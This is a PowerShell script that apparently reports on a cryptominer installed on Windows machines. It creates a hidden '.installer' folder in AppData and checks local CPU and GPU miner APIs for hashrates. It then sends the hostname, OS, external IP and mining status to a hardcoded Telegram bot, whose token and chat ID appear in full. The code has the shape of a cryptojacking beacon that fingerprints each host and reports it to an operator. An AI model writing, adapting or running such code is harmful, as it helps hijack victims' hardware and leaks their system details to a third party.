# ================= UTF-8 SAFE =================
$OutputEncoding = [System.Text.Encoding]::UTF8

# ================= SAFETY ====================
if ($env:ALLOW_MINING -ne "1") { exit }

# ================= TELEGRAM ==================
$TG_TOKEN = "8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
$TG_CHAT  = "5336452267"

function Send-TG($text) {
    $body = @{
        chat_id = $TG_CHAT
        text    = $text
    }
    $json  = $body | ConvertTo-Json -Depth 5
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)

    Invoke-WebRequest `
        -Uri "https://api.telegram.org/bot$TG_TOKEN/sendMessage" `
        -Method POST `
        -ContentType "application/json; charset=utf-8" `
        -Body $bytes `
        -ErrorAction SilentlyContinue | Out-Null
}

# ================= ONE-TIME ==================
$BASE = "$env:APPDATA\.installer"
$marker = "$BASE\reported.flag"
if (Test-Path $marker) { exit }
New-Item -ItemType Directory -Force -Path $BASE | Out-Null

# ================= SYSTEM INFO ===============
$HOST = $env:COMPUTERNAME
$OS   = (Get-CimInstance Win32_OperatingSystem).Caption
$TIME = Get-Date

# external IP (real)
try {
    $IP = (Invoke-RestMethod "https://api.ipify.org").Trim()
} catch {
    $IP = "unknown"
}

# ================= TIMEOUT CONFIG ============
$TIMEOUT = 120
$STEP = 5
$elapsed = 0

$cpuOK = $false
$gpuOK = $false
$cpuHR = 0
$gpuHR = 0

# ================= WAIT FOR SERVICES =========
while ($elapsed -lt $TIMEOUT) {

    try {
        $cpu = Invoke-RestMethod "http://127.0.0.1:16000/1/summary"
        $cpuHR = [int]$cpu.hashrate.total[0]
        if ($cpuHR -gt 0) { $cpuOK = $true }
    } catch {}

    try {
        $gpu = Invoke-RestMethod "http://127.0.0.1:8080/summary"
        $gpuHR = [int]($gpu.Session.Performance_Summary.Performance * 1000000)
        if ($gpuHR -gt 0) { $gpuOK = $true }
    } catch {}

    if ($cpuOK -or $gpuOK) { break }

    Start-Sleep $STEP
    $elapsed += $STEP
}

# ================= FINAL STATUS ==============
if ($cpuOK -and $gpuOK) {
    $STATUS = "OK"
} elseif ($cpuOK -or $gpuOK) {
    $STATUS = "PARTIAL"
} else {
    $STATUS = "FAILED"
}

# ================= REPORT ====================
Send-TG @"
Windows installer report

Status: $STATUS
Host: $HOST
External IP: $IP
OS: $OS

CPU mining: $cpuOK
CPU hashrate: $cpuHR H/s

GPU mining: $gpuOK
GPU hashrate: $gpuHR H/s

Elapsed: ${elapsed}s
Time: $TIME
"@

New-Item -ItemType File -Path $marker | Out-Null
